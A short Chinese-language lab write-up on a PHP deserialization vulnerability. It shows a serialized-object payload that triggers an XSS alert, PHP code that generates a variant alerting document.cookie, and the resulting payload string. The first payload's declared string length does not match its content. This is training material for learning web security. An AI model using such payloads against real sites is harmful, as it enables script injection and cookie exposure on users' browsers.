# PHP反序列化漏洞

　　顾名思义 php被序列化 反序列化的利用

　　概述里作者给我了我们一个payload，我们提交试一下

　　​**​`O:1:"S":1:{s:4:"test";s:29:"<script>alert('xss')";}`​** 

　　成功xss弹窗

　　当然我们也可以利用在线php运行工具生成其他payload 不过得根据源代码

　　<?php  
class S{  
	var $test="<script>alert(document.cookie)</script>";  
}

　　 **$a=new S();
echo serialize($a)
?&gt;**

　　[PHP 在线工具 | 菜鸟工具](https://www.jyshare.com/compile/1/)

![image](assets/image-20251122155011-lrojmph.png)

　　**O:1:"S":1:{s:4:"test";s:39:"&lt;script&gt;alert(document.cookie)&lt;/script&gt;";}**

![image](assets/image-20251122155046-iefdg7j.png)
